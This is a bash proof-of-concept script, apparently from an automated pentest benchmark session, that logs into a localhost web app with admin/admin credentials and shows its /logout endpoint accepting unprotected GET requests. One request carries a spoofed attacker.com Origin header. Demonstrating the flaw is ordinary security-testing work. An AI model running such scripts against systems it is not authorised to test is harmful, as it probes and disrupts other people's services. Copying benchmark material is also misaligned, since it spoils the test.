#!/bin/bash
# POC: Demonstrates CSRF vulnerability on /logout endpoint using GET method without CSRF token protection. Shows that logout can be triggered from a malicious cross-origin request.
# Target: ./repo
# Created: 2025-11-04T19:39:23.418Z
# Session: benchmark-XBEN-024-24-mhkyvn4q

# CSRF Vulnerability on Logout - GET Method Without CSRF Token Protection
# This POC demonstrates that the /logout endpoint can be triggered via GET request
# without CSRF token validation, allowing cross-site logout attacks

TARGET_URL="${1:-http://localhost:5000}"
LOGOUT_ENDPOINT="$TARGET_URL/logout"

echo "=========================================="
echo "CSRF Logout Vulnerability POC"
echo "=========================================="
echo "Target: $LOGOUT_ENDPOINT"
echo ""

# Step 1: Create a session by logging in
echo "[*] Step 1: Authenticating to establish a session..."
LOGIN_RESPONSE=$(curl -s -c /tmp/cookies.txt "$TARGET_URL/login" -X POST \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "username=admin&password=admin")

if echo "$LOGIN_RESPONSE" | grep -q "login"; then
  echo "[✓] Login response received"
else
  echo "[!] Login may have failed, but continuing with test..."
fi

# Step 2: Verify session is active by accessing a protected endpoint
echo ""
echo "[*] Step 2: Verifying active session..."
SESSION_CHECK=$(curl -s -b /tmp/cookies.txt "$TARGET_URL/")
if echo "$SESSION_CHECK" | grep -q "logout"; then
  echo "[✓] Session is active (logout link present in response)"
else
  echo "[!] Could not verify active session"
fi

# Step 3: Trigger logout via GET request (demonstrating CSRF vulnerability)
echo ""
echo "[*] Step 3: Triggering logout via GET request (CSRF attack)..."
LOGOUT_RESPONSE=$(curl -s -i -b /tmp/cookies.txt "$LOGOUT_ENDPOINT" 2>&1)

if echo "$LOGOUT_RESPONSE" | grep -qi "302\|location"; then
  echo "[✓] CSRF VULNERABILITY CONFIRMED: GET request to /logout was accepted"
  echo "[✓] Server responded with redirect (302 or similar)"
  echo ""
  echo "Response Headers:"
  echo "$LOGOUT_RESPONSE" | head -20
else
  echo "[!] Unexpected response"
  echo "$LOGOUT_RESPONSE"
fi

# Step 4: Verify logout was successful
echo ""
echo "[*] Step 4: Verifying logout was successful..."
AFTER_LOGOUT=$(curl -s -b /tmp/cookies.txt "$TARGET_URL/")
if echo "$AFTER_LOGOUT" | grep -q "login"; then
  echo "[✓] LOGOUT SUCCESSFUL: User session was cleared"
  echo "[✓] CSRF VULNERABILITY CONFIRMED: Logout was triggered via unprotected GET request"
else
  echo "[!] Session may still be active after logout attempt"
fi

# Step 5: Demonstrate that no CSRF token is required
echo ""
echo "[*] Step 5: Demonstrating no CSRF token validation..."
echo "[*] Re-authenticating..."
curl -s -c /tmp/cookies2.txt "$TARGET_URL/login" -X POST \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "username=admin&password=admin" > /dev/null

echo "[*] Attempting logout from different origin/without token..."
CSRF_TEST=$(curl -s -i -b /tmp/cookies2.txt -H "Origin: http://attacker.com" "$LOGOUT_ENDPOINT" 2>&1)

if echo "$CSRF_TEST" | grep -qi "302\|location"; then
  echo "[✓] CSRF TOKEN NOT REQUIRED: Request from different origin was accepted"
  echo "[✓] CSRF VULNERABILITY CONFIRMED: No origin validation or CSRF token check"
else
  echo "[!] Request was blocked"
fi

echo ""
echo "=========================================="
echo "CSRF Vulnerability Summary:"
echo "- /logout accepts GET requests (should be POST only)"
echo "- No CSRF token validation required"
echo "- No origin/referer validation performed"
echo "- State-changing operation (logout) exposed to CSRF attacks"
echo "=========================================="

# Cleanup
rm -f /tmp/cookies.txt /tmp/cookies2.txt